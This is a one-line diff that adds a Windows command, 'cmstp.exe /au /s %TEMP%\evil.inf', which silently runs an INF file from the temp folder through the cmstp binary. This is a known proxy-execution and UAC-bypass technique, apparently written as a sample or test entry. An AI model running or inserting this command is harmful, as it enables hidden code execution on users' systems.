@@ -1,0 +1,2 @@
+cmstp.exe /au /s %TEMP%\evil.inf
+
